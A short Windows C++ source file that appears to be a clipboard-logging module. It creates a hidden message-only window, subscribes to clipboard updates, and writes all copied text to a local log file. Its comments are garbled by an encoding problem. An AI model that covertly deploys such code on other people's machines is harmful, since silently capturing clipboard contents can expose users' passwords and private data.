#include <windows.h>
#include <string>
#include "pch.h"
#include "utils.h"

LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLIPBOARDUPDATE:
		if (OpenClipboard(hwnd))
		{
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData != NULL)
			{
				char* clipboardText = static_cast<char*>(GlobalLock(hData));
				if (clipboardText != NULL)
				{
					Log("clipboard.txt", "Clipboard changed: " + std::string(clipboardText) + "\n");
					GlobalUnlock(hData);
				}
			}
			CloseClipboard();
		}
		break;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

void ClipboardLogger()
{
	// step1. ���U�������O
	WNDCLASSEX wc = { 0 };
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.lpszClassName = L"ClipboardMonitor";
	RegisterClassEx(&wc);

	// step2. �Ы����õ���
	HWND hwnd = CreateWindow(L"ClipboardMonitor", NULL, 0, 0, 0, 0, 0,
		HWND_MESSAGE, NULL, NULL, NULL);

	// step3. ���U�ŶKï��ť
	AddClipboardFormatListener(hwnd);

	// step4. �T���j��
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}